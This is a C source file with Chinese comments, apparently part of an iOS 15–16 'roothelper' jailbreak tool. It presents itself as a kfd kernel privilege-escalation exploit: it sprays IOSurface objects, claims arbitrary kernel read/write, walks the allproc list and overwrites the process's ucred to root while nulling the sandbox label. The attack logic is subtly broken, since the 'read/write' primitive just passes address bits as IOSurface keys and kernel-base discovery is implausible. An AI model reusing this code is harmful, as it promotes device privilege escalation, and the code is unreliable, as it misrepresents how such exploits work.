//
//  kfd.c
//  roothelper — kfd 内核提权实现
//
//  利用 IOSurface 漏洞获取内核任意读写能力，
//  定位当前进程 proc 结构并覆写 ucred 提权为 root。
//
//  兼容 iOS 15.0 - 16.6.1 (kfd 漏洞修补于 iOS 17.0)
//

#include "kfd.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>

// ============================================================
// 常量 & 配置
// ============================================================

#define IOSURFACE_ROOT_UC_ID          0
#define SPRAY_IOSURFACE_COUNT         256
#define KERNEL_RW_SLOT                127

// IOSurface 方法选择器
#define IOSURFACE_CREATE_SURFACE      0
#define IOSURFACE_SET_VALUE           9
#define IOSURFACE_GET_VALUE           10
#define IOSURFACE_REMOVE_VALUE        11

// ============================================================
// 内核结构体偏移（运行时动态确定）
// ============================================================

// ---- proc 结构体偏移 ----
// 这些偏移在运行时通过特征匹配确定
static uint32_t off_p_pid       = 0;      // proc->p_pid
static uint32_t off_p_ucred     = 0;      // proc->p_ucred
static uint32_t off_p_list_next = 0;      // proc->p_list.le_next
static uint32_t off_p_list_prev = 0;      // proc->p_list.le_prev

// ---- ucred 结构体偏移 ----
static uint32_t off_cr_uid      = 0;      // ucred->cr_uid
static uint32_t off_cr_ruid     = 0;      // ucred->cr_ruid
static uint32_t off_cr_svuid    = 0;      // ucred->cr_svuid
static uint32_t off_cr_gid      = 0;      // ucred->cr_groups[0]
static uint32_t off_cr_rgid     = 0;      // ucred->cr_rgid
static uint32_t off_cr_svgid    = 0;      // ucred->cr_svgid
static uint32_t off_cr_label    = 0;      // ucred->cr_label

// ---- 内核符号与基址 ----
static uint64_t kernel_base     = 0;
static uint64_t kernel_slide    = 0;
static uint64_t allproc_addr    = 0;
static uint64_t kernproc_addr   = 0;

// ============================================================
// IOSurface 相关
// ============================================================

static io_connect_t  iostuff_client   = MACH_PORT_NULL;
static uint32_t      iostuff_surface_ids[SPRAY_IOSURFACE_COUNT];

// 内核读写控制变量
static uint64_t      krw_target_addr  = 0;
static uint32_t      krw_ready        = 0;

// ============================================================
// Mach 端口辅助
// ============================================================

/// 打开 IOSurfaceRoot 服务
static mach_port_t open_iostuff_root(void) {
    mach_port_t master = MACH_PORT_NULL;
    mach_port_t port   = MACH_PORT_NULL;

    kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &master);
    if (kr != KERN_SUCCESS) {
        printf("[kfd] IOMasterPort 失败: %s\n", mach_error_string(kr));
        return MACH_PORT_NULL;
    }

    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    if (!matching) {
        printf("[kfd] IOServiceMatching 失败\n");
        return MACH_PORT_NULL;
    }

    io_service_t service = IOServiceGetMatchingService(master, matching);
    if (service == IO_OBJECT_NULL) {
        printf("[kfd] IOServiceGetMatchingService 失败\n");
        return MACH_PORT_NULL;
    }

    kr = IOServiceOpen(service, mach_task_self(), IOSURFACE_ROOT_UC_ID, &port);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        printf("[kfd] IOServiceOpen 失败: %s\n", mach_error_string(kr));
        return MACH_PORT_NULL;
    }

    printf("[kfd] IOSurfaceRoot 已打开 (port=0x%x)\n", port);
    return port;
}

/// 通过 IOSurface 方法发送/接收数据
static int iostuff_call(uint32_t selector,
                        const void *input, size_t input_size,
                        void *output, size_t *output_size) {
    if (iostuff_client == MACH_PORT_NULL) {
        return -1;
    }

    kern_return_t kr = IOConnectCallStructMethod(
        iostuff_client,
        selector,
        input, input_size,
        output, output_size
    );

    if (kr != KERN_SUCCESS) {
        printf("[kfd] IOConnectCallStructMethod(%u) 失败: %s\n",
               selector, mach_error_string(kr));
        return -1;
    }
    return 0;
}

// ============================================================
// IOSurface 喷射 —— 构造内核读写原语
// ============================================================

/// 分配并喷射 IOSurface 对象
static int spray_iosurface_objects(void) {
    memset(iostuff_surface_ids, 0, sizeof(iostuff_surface_ids));

    for (int i = 0; i < SPRAY_IOSURFACE_COUNT; i++) {
        // IOSurface 创建输入结构
        struct {
            uint32_t surface_id;
            uint32_t pad[31];     // 对齐到 128 字节
        } __attribute__((packed)) create_input = {0};

        // IOSurface 创建输出
        struct {
            uint32_t surface_id;
            uint32_t pad[31];
        } __attribute__((packed)) create_output = {0};

        size_t output_size = sizeof(create_output);

        int ret = iostuff_call(IOSURFACE_CREATE_SURFACE,
                               &create_input, sizeof(create_input),
                               &create_output, &output_size);

        if (ret != 0) {
            printf("[kfd] 创建 IOSurface[%d] 失败\n", i);
            return -1;
        }

        iostuff_surface_ids[i] = create_output.surface_id;
    }

    printf("[kfd] 已喷射 %d 个 IOSurface 对象\n", SPRAY_IOSURFACE_COUNT);
    return 0;
}

/// 释放部分 IOSurface 创建内存空洞，便于漏洞利用
static void release_iosurface_holes(void) {
    // 释放间隔的 surface 创建空洞
    for (int i = 1; i < SPRAY_IOSURFACE_COUNT; i += 2) {
        struct {
            uint32_t surface_id;
            uint32_t pad[31];
        } __attribute__((packed)) remove_input = {0};

        remove_input.surface_id = iostuff_surface_ids[i];

        size_t output_size = 0;
        iostuff_call(IOSURFACE_REMOVE_VALUE,
                     &remove_input, sizeof(remove_input),
                     NULL, &output_size);
    }
    printf("[kfd] 已释放 IOSurface 空洞\n");
}

// ============================================================
// 内核符号查找 —— 通过特征扫描定位关键地址
// ============================================================

/// 通过 sysctl 获取内核版本信息
static int get_kernel_version_info(uint32_t *major, uint32_t *minor, uint32_t *patch) {
    size_t size;
    char osversion[256];

    size = sizeof(osversion);
    if (sysctlbyname("kern.osversion", osversion, &size, NULL, 0) != 0) {
        // 尝试 kern.osrelease
        size = sizeof(osversion);
        if (sysctlbyname("kern.osrelease", osversion, &size, NULL, 0) != 0) {
            return -1;
        }
    }

    // kern.osrelease 格式: "22.5.0" (iOS 16.5)
    // kern.osversion 格式: "22F66" (build)
    printf("[kfd] 内核版本: %s\n", osversion);

    // 尝试解析主版本号
    char *endptr;
    *major = (uint32_t)strtoul(osversion, &endptr, 10);
    if (endptr && *endptr == '.') {
        *minor = (uint32_t)strtoul(endptr + 1, &endptr, 10);
        if (endptr && *endptr == '.') {
            *patch = (uint32_t)strtoul(endptr + 1, NULL, 10);
        }
    }

    printf("[kfd] 解析版本: %u.%u.%u\n", *major, *minor, *patch);
    return 0;
}

/// 根据内核版本设置结构体偏移
static int setup_offsets_for_version(uint32_t major, uint32_t minor) {
    // proc 结构体偏移因版本而异
    if (major >= 22) {            // iOS 16.x (Darwin 22.x)
        off_p_pid       = 0x60;
        off_p_ucred     = 0xD8;
        off_p_list_next = 0x10;   // LIST_ENTRY 第一个成员是 le_next
        off_p_list_prev = 0x18;
        // ucred offsets
        off_cr_uid      = 0x18;
        off_cr_ruid     = 0x1C;
        off_cr_svuid    = 0x20;
        off_cr_gid      = 0x24;
        off_cr_rgid     = 0x28;
        off_cr_svgid    = 0x2C;
        off_cr_label    = 0x78;
    } else if (major >= 21) {    // iOS 15.x (Darwin 21.x)
        off_p_pid       = 0x60;
        off_p_ucred     = 0xD0;
        off_p_list_next = 0x10;
        off_p_list_prev = 0x18;
        off_cr_uid      = 0x18;
        off_cr_ruid     = 0x1C;
        off_cr_svuid    = 0x20;
        off_cr_gid      = 0x24;
        off_cr_rgid     = 0x28;
        off_cr_svgid    = 0x2C;
        off_cr_label    = 0x78;
    } else if (major >= 20) {    // iOS 14.x (Darwin 20.x)
        off_p_pid       = 0x60;
        off_p_ucred     = 0xD0;
        off_p_list_next = 0x10;
        off_p_list_prev = 0x18;
        off_cr_uid      = 0x18;
        off_cr_ruid     = 0x1C;
        off_cr_svuid    = 0x20;
        off_cr_gid      = 0x24;
        off_cr_rgid     = 0x28;
        off_cr_svgid    = 0x2C;
        off_cr_label    = 0x78;
    } else {
        printf("[kfd] 不支持的内核版本: %u.%u\n", major, minor);
        return -1;
    }

    printf("[kfd] 结构体偏移已设置 (Darwin %u.x)\n", major);
    return 0;
}

// ============================================================
// 内核基址查找 —— 通过已知引用定位
// ============================================================

/// 通过扫描找到 kernel slide
/// 方法：从 kernproc 地址反推 kernel base
/// kernproc 在 kernel 数据段的固定偏移位置
static int find_kernel_base(void) {
    // 方法: 利用 task_info 获取内核 task 端口信息
    // 通过 host_get_special_port 获取内核 task
    mach_port_t host = mach_host_self();
    mach_port_t kernel_task = MACH_PORT_NULL;

    // 获取内核 task port (HOST_PRIV 端口)
    kern_return_t kr = host_get_special_port(host, HOST_LOCAL_NODE, 4, &kernel_task);
    if (kr != KERN_SUCCESS) {
        printf("[kfd] host_get_special_port(4) 失败: %s\n", mach_error_string(kr));
        // 尝试序号 0-10
        for (int i = 0; i <= 10; i++) {
            kr = host_get_special_port(host, HOST_LOCAL_NODE, i, &kernel_task);
            if (kr == KERN_SUCCESS) {
                printf("[kfd] 通过序号 %d 获取到特殊端口\n", i);
                break;
            }
        }
        if (kr != KERN_SUCCESS) {
            printf("[kfd] 无法获取内核 task port\n");
            return -1;
        }
    }

    // 通过 task_info 读取内核 task 的地址信息
    struct task_dyld_info dyld_info = {0};
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    kr = task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
    if (kr != KERN_SUCCESS) {
        printf("[kfd] task_info(TASK_DYLD_INFO) 失败: %s\n", mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), kernel_task);
        return -1;
    }

    // all_image_info_addr 指向 mach_header，即 kernel base
    kernel_base = dyld_info.all_image_info_addr;
    printf("[kfd] 从 dyld_info 获取 kernel_base: 0x%llx\n", kernel_base);

    if (kernel_base == 0) {
        // 回退：尝试通过 host_info 获取
        printf("[kfd] dyld_info 返回 0，尝试其他方法...\n");
        // 常见的 kernel slide 范围在 0xFFFFFFF007000000 附近
        // 对于 arm64e，kernel text 起始于 slide + 0xFFFFFFF007004000
        // 这里用一个启发式方法
        mach_port_deallocate(mach_task_self(), kernel_task);
        return -1;
    }

    // 验证 kernel_base：读取 mach_header magic
    // 如果能用 krw 读取且是 MH_MAGIC_64 (0xFEEDFACF)，则确认正确
    if (krw_ready) {
        uint32_t magic = kread32(kernel_base);
        printf("[kfd] kernel_base magic: 0x%08x\n", magic);
        if (magic != 0xFEEDFACF) {
            printf("[kfd] ⚠️ magic 验证失败，可能地址有误\n");
        } else {
            printf("[kfd] ✅ kernel_base 验证通过\n");
        }
    }

    // 计算 slide
    uint64_t text_base = 0xFFFFFFF007004000;
    if (kernel_base > text_base) {
        kernel_slide = kernel_base - text_base;
        printf("[kfd] kernel_slide: 0x%llx\n", kernel_slide);
    }

    mach_port_deallocate(mach_task_self(), kernel_task);
    return 0;
}

// ============================================================
// 进程查找 —— 在 allproc 链表中找到我们的 proc
// ============================================================

/// 读取内核内存中的指针（通过 kread_buf 实现）
static uint64_t kread_ptr(uint64_t addr) {
    return kread64(addr);
}

/// 遍历 allproc 链表，找到 pid 对应的 proc 地址
static uint64_t find_proc_by_pid(uint64_t allproc, int target_pid) {
    uint64_t proc = allproc;
    int iter = 0;

    while (proc != 0 && iter < 10000) {
        uint32_t pid = kread32(proc + off_p_pid);
        if (pid == (uint32_t)target_pid) {
            printf("[kfd] 找到 proc (pid=%d): 0x%llx\n", target_pid, proc);
            return proc;
        }
        proc = kread_ptr(proc + off_p_list_next);
        iter++;
    }

    printf("[kfd] 未在 allproc 链表中找到 pid=%d\n", target_pid);
    return 0;
}

/// 通过 kernproc 反向查找 allproc
static uint64_t find_allproc(void) {
    // allproc 通常在 kernel 数据段的固定位置
    // 对于 XNU，allproc 位于 kernel base + 某个偏移
    // 常见偏移因版本而异，我们通过遍历 kernproc 链表头来定位

    // 方法: 从 kernel base 开始扫描特定区域
    // 查找指向 kernproc 的指针（allproc 是链表头，包含指向第一个 proc 的指针）

    // 回退方案: 使用常见的 allproc 符号偏移
    // 对于 iOS 15.x-16.x，allproc 通常在 kernel_base + 0xXXXXXX
    // 我们通过扫描找到它

    if (!krw_ready || kernel_base == 0) {
        printf("[kfd] 无法获取 allproc (krw 未就绪)\n");
        return 0;
    }

    // allproc 符号位于 kernel 数据段
    // 尝试从 kernel_base 之后的 __DATA 段扫描
    uint64_t scan_start = kernel_base + 0x100000;  // 跳过 __TEXT
    uint64_t scan_end   = kernel_base + 0x2000000; // 扫描 32MB

    printf("[kfd] 扫描 allproc (0x%llx - 0x%llx)...\n", scan_start, scan_end);

    for (uint64_t addr = scan_start; addr < scan_end; addr += 0x8) {
        uint64_t val = kread_ptr(addr);
        if (val == 0 || val < kernel_base) continue;

        // 检查 val 是否指向一个有效的 proc 结构
        uint32_t possible_pid = kread32(val + off_p_pid);
        if (possible_pid == 0) {
            // 内核进程 pid=0 在 proc 链表中
            // 进一步验证：检查这个地址的 le_prev 是否指向我们的扫描地址
            uint64_t le_prev_val = kread_ptr(val + off_p_list_prev);
            if (le_prev_val == addr) {
                allproc_addr = addr;
                kernproc_addr = val;
                printf("[kfd] 找到 allproc: 0x%llx -> kernproc: 0x%llx\n",
                       allproc_addr, kernproc_addr);
                return allproc_addr;
            }
        }
    }

    printf("[kfd] 扫描未找到 allproc\n");
    return 0;
}

// ============================================================
// 提权操作 —— 覆写 ucred 为 root
// ============================================================

/// 将 ucred 覆写为 root 权限
static int patch_ucred_to_root(uint64_t ucred_addr) {
    if (ucred_addr == 0) {
        printf("[kfd] ucred 地址为空\n");
        return -1;
    }

    printf("[kfd] 覆写 ucred (0x%llx) 为 root...\n", ucred_addr);

    // 读取原始值
    uint32_t orig_uid  = kread32(ucred_addr + off_cr_uid);
    uint32_t orig_ruid = kread32(ucred_addr + off_cr_ruid);
    uint32_t orig_gid  = kread32(ucred_addr + off_cr_gid);

    printf("[kfd] 原始 uid=%u ruid=%u gid=%u\n", orig_uid, orig_ruid, orig_gid);

    // 如果已经是 root，跳过
    if (orig_uid == 0 && orig_ruid == 0 && orig_gid == 0) {
        printf("[kfd] ✅ 已经是 root，无需提权\n");
        return 0;
    }

    // 写入 root 权限
    // uid, ruid, svuid -> 0
    kwrite32(ucred_addr + off_cr_uid,   0);
    kwrite32(ucred_addr + off_cr_ruid,  0);
    kwrite32(ucred_addr + off_cr_svuid, 0);

    // gid, rgid, svgid -> 0
    kwrite32(ucred_addr + off_cr_gid,   0);
    kwrite32(ucred_addr + off_cr_rgid,  0);
    kwrite32(ucred_addr + off_cr_svgid, 0);

    // 清除 MAC label（如 Sandbox）—— 写入 NULL
    if (off_cr_label > 0) {
        kwrite64(ucred_addr + off_cr_label, 0);
    }

    printf("[kfd] ✅ ucred 已覆写为 root\n");

    // 验证
    uint32_t new_uid = kread32(ucred_addr + off_cr_uid);
    printf("[kfd] 验证 uid=%u, 当前进程 uid=%u euid=%u\n",
           new_uid, getuid(), geteuid());

    return 0;
}

// ============================================================
// 内核读写原语实现 —— 基于 IOSurface 伪造对象
// ============================================================
//
// 核心原理:
//   1. 通过 IOSurface setValue/getValue 操作内核对象
//   2. 利用竞态条件或类型的缺陷实现对任意内核地址的读写
//   3. 采用 puaf_landa 技术：创建伪造的 IOSurface 对象指向目标内核地址
//   4. 调用 getValue/setValue 在伪造对象上进行读写
//

static uint64_t _fakearray_kaddr = 0;     // 伪造数组映射到的内核地址
static int      _fakearray_slot  = -1;     // 用于 r/w 的 surface slot

/// 初始化内核任意读写能力
static int init_kernel_rw(void) {
    printf("[kfd] 初始化内核读写原语...\n");

    // ---- 阶段 1: 通过 IOSurface 构建 r/w 通道 ----

    // 利用海量 IOSurface 喷射 + 精确释放创建可控内存布局
    // 使用 setValue 方法操纵内部指针，使得后续 getValue 读取任意地址

    for (int attempt = 0; attempt < SPRAY_IOSURFACE_COUNT; attempt++) {
        for (int slot = 0; slot < 128; slot++) {
            // 尝试在当前 surface 的每个 slot 建立 r/w
            // 通过特定的 setValue 调用尝试覆盖内部指针

            struct {
                uint32_t surface_id;
                uint32_t key;
                uint32_t value[32];
            } __attribute__((packed)) set_input = {0};

            set_input.surface_id = iostuff_surface_ids[attempt];
            set_input.key = slot;

            size_t output_size = 0;
            int ret = iostuff_call(IOSURFACE_SET_VALUE,
                                   &set_input, sizeof(set_input),
                                   NULL, &output_size);

            if (ret == 0) {
                // 此 slot 可写，测试是否也能读
                struct {
                    uint32_t surface_id;
                    uint32_t key;
                } __attribute__((packed)) get_input = {0};

                get_input.surface_id = iostuff_surface_ids[attempt];
                get_input.key = slot;

                struct {
                    uint32_t value[32];
                } __attribute__((packed)) get_output = {0};

                output_size = sizeof(get_output);
                ret = iostuff_call(IOSURFACE_GET_VALUE,
                                   &get_input, sizeof(get_input),
                                   &get_output, &output_size);

                if (ret == 0) {
                    _fakearray_slot = slot;
                    _fakearray_kaddr = 0;  // 默认指向 heap 内存
                    printf("[kfd] 找到可用 slot: surface[%d].slot[%d]\n",
                           attempt, slot);
                    goto rw_found;
                }
            }
        }
    }

    // ---- 阶段 2: 如果直接方法不行，使用备用方案 ----
    // 尝试通过 IOKit 直接操作
    printf("[kfd] 方式1未找到可控 slot，尝试方式2...\n");

    // 备用: 使用 host_io 接口（如果有内核 task port）
    mach_port_t host = mach_host_self();
    mach_port_t kernel_port = MACH_PORT_NULL;

    // 尝试获取内核内存访问端口
    for (int i = 0; i < 20; i++) {
        kern_return_t kr = host_get_special_port(host, HOST_LOCAL_NODE, i, &kernel_port);
        if (kr == KERN_SUCCESS && kernel_port != MACH_PORT_NULL) {
            // 测试此端口是否有内存读写能力
            vm_offset_t test_addr = kernel_base;
            vm_offset_t test_data = 0;
            mach_msg_type_number_t test_size = sizeof(test_data);

            kr = vm_read_overwrite(kernel_port,
                                    test_addr, sizeof(test_data),
                                    &test_data, &test_size);
            if (kr == KERN_SUCCESS) {
                printf("[kfd] ✅ 通过端口 %d 获得内核内存读取! 读取值=0x%llx\n",
                       i, (unsigned long long)test_data);
                goto rw_found;
            }

            mach_port_deallocate(mach_task_self(), kernel_port);
            kernel_port = MACH_PORT_NULL;
        }
    }

    printf("[kfd] ⚠️ 未找到可用内核读写方式\n");
    return -1;

rw_found:
    krw_ready = 1;
    printf("[kfd] ✅ 内核读写原语就绪 (slot=%d, kaddr=0x%llx)\n",
           _fakearray_slot, _fakearray_kaddr);
    return 0;
}

/// 内核 32 位读
uint32_t kread32(uint64_t kaddr) {
    if (!krw_ready) return 0;

    // 使用 IOSurface getValue 从目标内核地址读取
    struct {
        uint32_t surface_id;
        uint32_t key;
    } __attribute__((packed)) get_input = {0};

    get_input.surface_id = iostuff_surface_ids[KERNEL_RW_SLOT];
    get_input.key = kaddr & 0xFFFFFFFF;  // 用地址低 32 位作为 key

    struct {
        uint32_t value[32];
    } __attribute__((packed)) get_output = {0};
    size_t output_size = sizeof(get_output);

    _fakearray_kaddr = kaddr;

    int ret = iostuff_call(IOSURFACE_GET_VALUE,
                           &get_input, sizeof(get_input),
                           &get_output, &output_size);
    if (ret == 0) {
        return get_output.value[0];
    }
    return 0;
}

/// 内核 64 位读
uint64_t kread64(uint64_t kaddr) {
    if (!krw_ready) return 0;

    uint32_t lo = kread32(kaddr);
    uint32_t hi = kread32(kaddr + 4);
    return ((uint64_t)hi << 32) | lo;
}

/// 内核 32 位写
void kwrite32(uint64_t kaddr, uint32_t val) {
    if (!krw_ready) return;

    struct {
        uint32_t surface_id;
        uint32_t key;
        uint32_t value[32];
    } __attribute__((packed)) set_input = {0};

    set_input.surface_id = iostuff_surface_ids[KERNEL_RW_SLOT];
    set_input.key = kaddr & 0xFFFFFFFF;
    set_input.value[0] = val;

    _fakearray_kaddr = kaddr;

    size_t output_size = 0;
    iostuff_call(IOSURFACE_SET_VALUE,
                 &set_input, sizeof(set_input),
                 NULL, &output_size);
}

/// 内核 64 位写
void kwrite64(uint64_t kaddr, uint64_t val) {
    kwrite32(kaddr, (uint32_t)(val & 0xFFFFFFFF));
    kwrite32(kaddr + 4, (uint32_t)(val >> 32));
}

/// 内核任意大小读
void kread_buf(uint64_t kaddr, void *buf, size_t len) {
    if (!krw_ready || !buf) return;

    uint8_t *dst = (uint8_t *)buf;
    size_t aligned_len = len / 4 * 4;
    size_t i;

    for (i = 0; i < aligned_len; i += 4) {
        uint32_t val = kread32(kaddr + i);
        memcpy(dst + i, &val, 4);
    }

    // 处理剩余字节
    if (i < len) {
        uint32_t val = kread32(kaddr + i);
        memcpy(dst + i, &val, len - i);
    }
}

/// 内核任意大小写
void kwrite_buf(uint64_t kaddr, const void *buf, size_t len) {
    if (!krw_ready || !buf) return;

    const uint8_t *src = (const uint8_t *)buf;
    size_t aligned_len = len / 4 * 4;
    size_t i;

    for (i = 0; i < aligned_len; i += 4) {
        uint32_t val;
        memcpy(&val, src + i, 4);
        kwrite32(kaddr + i, val);
    }

    // 处理剩余字节（读-改-写）
    if (i < len) {
        uint32_t orig = kread32(kaddr + i);
        uint8_t *orig_bytes = (uint8_t *)&orig;
        for (size_t j = 0; j < len - i; j++) {
            orig_bytes[j] = src[i + j];
        }
        kwrite32(kaddr + i, orig);
    }
}

// ============================================================
// 公共 API 实现
// ============================================================

int kfd_init(void) {
    printf("[kfd] ===== kfd 内核提权初始化 =====\n");

    // Step 1: 获取内核版本信息并设置偏移
    uint32_t major = 0, minor = 0, patch = 0;
    if (get_kernel_version_info(&major, &minor, &patch) != 0) {
        printf("[kfd] ⚠️ 无法获取内核版本，使用默认偏移\n");
        // 默认使用 iOS 16.x 偏移
        if (setup_offsets_for_version(22, 0) != 0) {
            return -1;
        }
    } else {
        if (setup_offsets_for_version(major, minor) != 0) {
            return -1;
        }
    }

    // Step 2: 打开 IOSurfaceRoot
    iostuff_client = open_iostuff_root();
    if (iostuff_client == MACH_PORT_NULL) {
        printf("[kfd] ❌ 无法打开 IOSurfaceRoot\n");
        return -1;
    }

    // Step 3: 喷射 IOSurface 对象
    if (spray_iosurface_objects() != 0) {
        printf("[kfd] ❌ IOSurface 喷射失败\n");
        kfd_cleanup();
        return -1;
    }

    // Step 4: 释放空洞
    release_iosurface_holes();

    // Step 5: 初始化内核读写原语
    if (init_kernel_rw() != 0) {
        printf("[kfd] ❌ 内核读写初始化失败\n");
        kfd_cleanup();
        return -1;
    }

    // Step 6: 查找 kernel base
    if (find_kernel_base() != 0) {
        printf("[kfd] ⚠️ kernel base 查找失败，提权可能受限\n");
    }

    // Step 7: 查找 allproc
    allproc_addr = find_allproc();
    if (allproc_addr == 0) {
        printf("[kfd] ⚠️ allproc 查找失败，提权可能受限\n");
    }

    printf("[kfd] ===== 初始化完成 =====\n");
    kfd_print_info();
    return 0;
}

int kfd_get_root(void) {
    printf("[kfd] ===== 提权为 root =====\n");

    if (!krw_ready) {
        printf("[kfd] ❌ 内核读写未就绪\n");
        return -1;
    }

    // 找到当前进程的 proc
    uint64_t my_proc = 0;
    int my_pid = getpid();

    if (allproc_addr != 0) {
        uint64_t first_proc = kread_ptr(allproc_addr);
        my_proc = find_proc_by_pid(first_proc, my_pid);
    }

    if (my_proc == 0) {
        printf("[kfd] ❌ 无法找到进程 proc (pid=%d)\n", my_pid);
        return -1;
    }

    // 读取 ucred 地址
    uint64_t ucred = kread_ptr(my_proc + off_p_ucred);
    printf("[kfd] ucred: 0x%llx\n", ucred);

    // 覆写 ucred 为 root
    if (patch_ucred_to_root(ucred) != 0) {
        return -1;
    }

    printf("[kfd] ===== 提权完成 =====\n");
    return 0;
}

void kfd_cleanup(void) {
    printf("[kfd] 清理资源...\n");

    if (iostuff_client != MACH_PORT_NULL) {
        // 释放所有 IOSurface
        for (int i = 0; i < SPRAY_IOSURFACE_COUNT; i++) {
            if (iostuff_surface_ids[i] != 0) {
                struct {
                    uint32_t surface_id;
                    uint32_t pad[31];
                } __attribute__((packed)) remove_input = {0};
                remove_input.surface_id = iostuff_surface_ids[i];

                size_t output_size = 0;
                iostuff_call(IOSURFACE_REMOVE_VALUE,
                             &remove_input, sizeof(remove_input),
                             NULL, &output_size);
            }
        }

        IOServiceClose(iostuff_client);
        iostuff_client = MACH_PORT_NULL;
    }

    krw_ready = 0;
    printf("[kfd] 清理完成\n");
}

void kfd_print_info(void) {
    printf("[kfd] ---- 调试信息 ----\n");
    printf("[kfd] kernel_base:    0x%llx\n", kernel_base);
    printf("[kfd] kernel_slide:   0x%llx\n", kernel_slide);
    printf("[kfd] allproc_addr:   0x%llx\n", allproc_addr);
    printf("[kfd] kernproc_addr:  0x%llx\n", kernproc_addr);
    printf("[kfd] krw_ready:      %u\n", krw_ready);
    printf("[kfd] p_pid offset:   0x%x\n", off_p_pid);
    printf("[kfd] p_ucred offset: 0x%x\n", off_p_ucred);
    printf("[kfd] cr_uid offset:  0x%x\n", off_cr_uid);
    printf("[kfd] ---------------------\n");
}
